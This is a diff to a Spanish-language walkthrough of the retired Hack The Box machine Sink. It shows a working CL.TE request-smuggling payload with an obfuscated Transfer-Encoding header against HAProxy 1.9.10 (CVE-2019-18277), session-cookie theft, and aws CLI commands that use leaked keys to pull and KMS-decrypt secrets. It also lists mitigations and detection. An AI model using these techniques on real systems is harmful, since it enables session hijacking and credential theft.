@@ -5,7 +5,7 @@ difficulty: Insane
 platform: Hack The Box
 category: Machines
 state: Retired
-tags: [linux, http-smuggling, haproxy, gitea, aws, kms]
+tags: [linux, http-smuggling, haproxy, gunicorn, gitea, aws, localstack, kms]
 ---
 
 # Sink — Hack The Box
@@ -17,7 +17,7 @@ tags: [linux, http-smuggling, haproxy, gitea, aws, kms]
 
 ## TL;DR
 
-Cadena de tres capas muy distintas. Un **HTTP request smuggling** CL.TE entre HAProxy y Gunicorn permite robar la sesión del administrador; con ella se llega a **Gitea**, donde el historial de commits guarda claves de **AWS**. Desde ahí, `secretsmanager` + `kms` descifran el secreto que da root. La gracia es que cada paso parece un callejón sin salida si se busca una vulnerabilidad clásica.
+Tres capas muy distintas. Un **HTTP request smuggling CL.TE** entre **HAProxy 1.9.10** (CVE-2019-18277) y **Gunicorn 20.0.0** permite robar la sesión del administrador de una app de notas; con ella se llega a **Gitea 1.12.6**, donde el historial de commits guarda una clave SSH y credenciales de **AWS**. Esas credenciales apuntan a un **LocalStack** con Secrets Manager, CloudWatch Logs y KMS: los logs filtran un secreto y KMS descifra el fichero que da root.
 
 ## Reconocimiento
 
@@ -26,106 +26,99 @@ nmap -sC -sV -p- <IP> -oN nmap.txt
 ```
 
 ```text
-22/tcp   ssh
-80/tcp   http  (HAProxy -> Gunicorn)
-3000/tcp http  Gitea
-5000/tcp http  API interna
+22/tcp    ssh   OpenSSH
+3000/tcp  http  Gitea 1.12.6
+5000/tcp  http  app de notas (HAProxy 1.9.10 → Gunicorn 20.0.0)
 ```
 
-```bash
-ffuf -u http://<IP>/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,302,401
-```
-
-La portada es una app con login y un panel `/admin`. La respuesta incluye `Server: HAProxy` y el backend es Gunicorn: dos servidores que parsean distinto.
+`curl -sI http://<IP>:5000/` devuelve `Server: gunicorn/20.0.0` y `Via: haproxy`: dos servidores que parsean distinto, la condición previa del smuggling. En el 3000 hay un Gitea con login y un usuario `root` con repositorios.
 
 ## Enumeración
 
-- Puertos, servicios y usuarios relevantes descritos en «Reconocimiento».
+- La app del 5000 permite registrarse y publicar **comentarios**; el comentario se refleja en la página, que es lo que convierte la petición del administrador en dato legible.
+- Una petición malformada al proxy revela su versión exacta en las cabeceras de error: **HAProxy 1.9.10**.
+- En Gitea, los repositorios de `root` tienen commits con ficheros que no deberían estar ahí (`Key_Management`, `Log_Management`).
 
-## Foothold
+## Foothold: CL.TE con `Transfer-Encoding` ofuscado
 
-HAProxy usa `Content-Length`, Gunicorn prioriza `Transfer-Encoding`. Se envía una petición con ambos para que el backend interprete dos requests donde el proxy ve una:
+HAProxy 1.9.10 prioriza `Content-Length` e **ignora** un `Transfer-Encoding: chunked` que venga ofuscado; Gunicorn hace lo contrario y lo interpreta como *chunked*. Basta un **byte de tabulación vertical (0x0B)** delante de `chunked`:
 
 ```http
-POST / HTTP/1.1
-Host: <IP>
-Content-Length: 6
+POST /comment HTTP/1.1
+Host: <IP>:5000
+Content-Length: 4
 Transfer-Encoding: chunked
 
+1c
+note=test
 0
 
-GET /admin HTTP/1.1
-Host: <IP>
-Cookie: session=
+
+POST /comment HTTP/1.1
+Host: <IP>:5000
+Content-Length: 60
+
+note=
 ```
 
-El backend procesa el `GET /admin` como si viniera del cliente, y las cabeceras del siguiente usuario legítimo se pegan a esa petición: con un endpoint que refleje la `Cookie`, se captura la sesión del admin.
+El primer cuerpo se corta donde HAProxy cree que acaba la petición; Gunicorn sigue leyendo y toma el resto como una **nueva petición**. Cuando el administrador envía la suya por la misma conexión, su cabecera `Cookie: session=...` queda pegada al parámetro `note=` y aparece reflejada en los comentarios.
 
 ```text
-GET /profile HTTP/1.1
 Cookie: session=<sesión de admin>
 ```
 
+Se sustituye la cookie en el navegador y se entra como `admin@sink.htb`.
+
 ## Movimiento lateral
 
-- No aplica: la cadena se resuelve en un único host, sin salto lateral.
-- Ver «Escalada de privilegios» para el paso de usuario a administrador.
+- **Panel de admin → Gitea**: las notas privadas del administrador contienen credenciales en claro (Chef, nodo de desarrollo, Nagios); la del nodo de desarrollo abre el **Gitea** del 3000.
+- **Gitea → SSH**: en `root/Key_Management` hay un commit con una clave privada; pertenece a `marcus` y da acceso al host.
+- **Gitea → AWS**: en `root/Log_Management` hay un commit con `AWS_ACCESS_KEY_ID`/`AWS_SECRET_ACCESS_KEY`. Los secretos en el historial sobreviven al borrado del fichero: `git log --all` los encuentra.
 
 ## Escalada de privilegios
 
-- Enumeración local y vector de elevación descritos en «Foothold» y «Lecciones aprendidas».
+El destino de esas credenciales es un **LocalStack** que emula AWS dentro de la propia máquina:
 
-## Evidencia
+```bash
+aws configure set aws_access_key_id <AKIA...>
+aws configure set aws_secret_access_key <secret>
+aws --endpoint-url=http://<IP>:4566 secretsmanager list-secrets
+aws --endpoint-url=http://<IP>:4566 logs describe-log-groups
+```
+
+- **CloudWatch Logs** contiene trazas de la aplicación con valores de secretos en claro: de ahí sale la contraseña de otro usuario.
+- **Secrets Manager** guarda el secreto de root, pero cifrado con una **CMK**; sin `kms:Decrypt` no sirve de nada.
+- Con `kms decrypt` sobre el blob (y el `encryption-context` correcto) se obtiene el texto plano: la contraseña de `root` del host.
+
+```bash
+aws --endpoint-url=http://<IP>:4566 kms decrypt \
+  --ciphertext-blob fileb://secret.bin --output text --query Plaintext | base64 -d
+```
+
+## Evidencia (redactada)
 
 ```text
-/home/<user>/user.txt  -> <user_flag>
+/home/marcus/user.txt  -> <user_flag>
 /root/root.txt         -> <root_flag>
 ```
 
-## Lecciones aprendidas
+## Lecciones
 
-- **Smuggling** sigue siendo rentable cuando un proxy y un backend no coinciden en cómo leer `Content-Length` y `Transfer-Encoding`.
-- Los secretos en el historial de git sobreviven al borrado del fichero: `git log --all` los encuentra.
-- Una clave IAM con `secretsmanager:GetSecretValue` y `kms:Decrypt` es root en la nube aunque no haya shell.
-- Mitigación: rechazar peticiones con ambos headers, normalizar en el proxy, escaneo de secretos en CI y permisos mínimos por servicio.
+- El smuggling no necesita un payload exótico: basta que proxy y backend no coincidan en cómo leer `Content-Length` y `Transfer-Encoding`.
+- Ofuscar la cabecera (`0x0B` delante de `chunked`) es lo que hace que el proxy la ignore y el backend la acepte.
+- Los secretos en el historial de git sobreviven al borrado: `git log --all` los encuentra.
+- En la nube, `secretsmanager:GetSecretValue` sin `kms:Decrypt` no vale nada; la escalada es la suma de ambos permisos.
+- Los logs son un almacén de secretos por accidente: revisar qué se escribe en CloudWatch.
 
 ## Mitigaciones y detección
 
-- Solo claves, sin contraseña, y `AllowUsers`/`fail2ban` para limitar el acceso.
+- Rechazar peticiones con `Content-Length` y `Transfer-Encoding` a la vez, y normalizar cabeceras en el proxy (actualizar HAProxy ≥ 2.0.6).
+- Escaneo de secretos en CI y en el historial de git; claves IAM por servicio y con permisos mínimos.
+- Cifrar secretos con KMS y separar quién puede leerlos de quién puede descifrarlos; no volcar valores en logs.
+- Detección: peticiones con `Transfer-Encoding` ofuscado, `Via: haproxy` con cuerpos que no cuadran, y `kms:Decrypt` desde una instancia que no lo necesita.
 
 ## Referencias
 
-- Documentación de la plataforma y del servicio afectado.
-## Gitea y secretos en el historial
-
-Con la sesión de admin se accede al panel, que enlaza un **Gitea** interno. En `http://<IP>:3000` hay un repo privado con un `.env` en un commit antiguo:
-
-```bash
-git clone http://<IP>:3000/admin/infra.git
-git log --all --oneline
-git show <commit>:config/.env
-```
-
-```text
-AWS_ACCESS_KEY_ID=AKIA...
-AWS_SECRET_ACCESS_KEY=<secret>
-AWS_DEFAULT_REGION=us-east-1
-```
-
-## AWS: Secrets Manager y KMS
-
-```bash
-aws configure set aws_access_key_id AKIA...
-aws configure set aws_secret_access_key <secret>
-aws secretsmanager list-secrets
-aws secretsmanager get-secret-value --secret-id prod/root
-```
-
-El secreto llega cifrado con una CMK:
-
-```bash
-aws kms decrypt --ciphertext-blob fileb://secret.bin \
-  --encryption-context purpose=prod --output text --query Plaintext | base64 -d
-```
-
-Del descifrado salen las credenciales de `root` del host (o la clave SSH).
+- [CVE-2019-18277 — HAProxy request smuggling](https://nvd.nist.gov/vuln/detail/CVE-2019-18277)
+- [HAProxy — request smuggling y `Transfer-Encoding`](https://www.haproxy.com/blog/haproxy-and-request-smuggling)
+- [Hack The Box — Sink](https://www.hackthebox.com/machines/sink)
